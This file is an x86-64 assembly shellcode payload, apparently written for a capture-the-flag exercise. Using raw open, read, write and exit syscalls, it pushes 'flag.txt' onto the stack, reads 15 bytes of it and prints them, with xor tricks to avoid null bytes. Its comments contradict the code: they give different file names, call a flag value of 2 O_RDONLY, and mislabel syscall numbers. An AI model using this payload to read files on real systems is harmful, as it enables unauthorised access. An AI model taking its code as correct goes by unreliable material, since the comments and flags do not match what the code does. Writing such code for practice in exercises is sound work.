global _start

section .text
_start:
	; push './flg.txt\x00'
	xor al, al
	push ax             ; push NULL string terminator
	mov rdi, 'flag.txt'  ; rest of file name
	push rdi             ; push to stack 

	; open('rsp', 'O_RDONLY') (rax: 2)
	mov al, 2     ; open syscall number (0)
	mov rdi, rsp  ; '/flg.txt'  ; move pointer to filename (1)
	xor esi, esi
	mov si, ax    ; set O_RDONLY flag (2)
	syscall
	
	; read file (rax: 0)
	;xor rsi, rsi
	lea rsi, [rdi]  ; pointer to opened file (2)
	mov rdi, rax    ; set fd to rax from open syscall (1)
	xor ax, ax    ; open syscall number        
	xor edx, edx
	mov dl, 15       ; size to read
	syscall
	
	; write output (rax: 1)
	;lea rsi, [rdi]  ; pointer to opened file (2)
	;xor rax, rax
	mov al, 1       ; write syscall (0)
	mov dil, 1      ; set fd to stdout (1)
	mov dl, 15      ; size to read (3)
	syscall

	; exit
	xor rax, rax
	mov al, 60
	xor rdi, rdi
	syscall

